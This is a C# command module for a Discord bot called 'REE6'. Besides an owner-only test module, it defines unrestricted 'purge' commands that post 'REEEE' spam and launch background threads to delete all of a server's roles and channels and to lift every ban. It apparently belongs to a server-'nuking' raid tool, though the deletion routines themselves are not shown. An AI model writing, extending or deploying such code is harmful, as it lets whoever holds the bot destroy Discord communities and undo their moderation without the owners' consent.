using Discord.Commands;
using System.Threading.Tasks;

namespace REE6
{
    [Group("tests")]
    [RequireOwner(ErrorMessage = "This is a test command and is not intended for public use", Group = "Owner command")]
    [Summary("Group for test commands")]
    public class TestModule : ModuleBase<SocketCommandContext>
    {
        [Command("test")]
        [Summary("A test command")]
        public async Task Test()
        {
            await Context.Channel.SendMessageAsync("test");
        }

        [Command("inputTest")]
        [Summary("tests input by sending a echo")]
        public async Task InputTest(string input)
        {
            await Context.Channel.SendMessageAsync($"You said: \"{input}\"");
        }
    }

    [Group("purge")]
    [Summary("Purge commands")]
    public class Purge : ModuleBase<SocketCommandContext>
    {
        [Command("all")]
        [Summary("Purges everything (roles, channels, and bans)")]
        public async Task PurgeAll()
        {
            await ReplyAsync("Purging everything...");
            await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
            new System.Threading.Thread(delegate() {
                Task.Run(() => PurgeActions.RolePurge(Context.Guild));
                Task.Run(() => PurgeActions.ChannelPurge(Context.Guild));
                Task.Run(() => PurgeActions.Unban(Context.Guild)); 
            }).Start();
        }

        [Command("roles")]
        [Summary("Only purges roles")]
        public async Task PurgeRole()
        {
            await ReplyAsync("Purging roles...");
            await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
            new System.Threading.Thread(delegate () {
                Task.Run(() => PurgeActions.RolePurge(Context.Guild));
            }).Start();
        }

        [Command("channels")]
        [Summary("Only purges channels")]
        public async Task PurgeChannels()
        {
            await ReplyAsync("Purging channels...");
            await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
            new System.Threading.Thread(delegate () {
                Task.Run(() => PurgeActions.ChannelPurge(Context.Guild));
            }).Start();
        }

        [Command("bans")]
        [Summary("Only purges bans")]
        public async Task Unban()
        {
            await ReplyAsync("Unbanning and attempting to invite " + Context.Guild.GetBansAsync().Result.Count + " people");
            await ReplyAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
            new System.Threading.Thread(delegate () {
                Task.Run(() => PurgeActions.Unban(Context.Guild));
            }).Start();
        }
    }
}
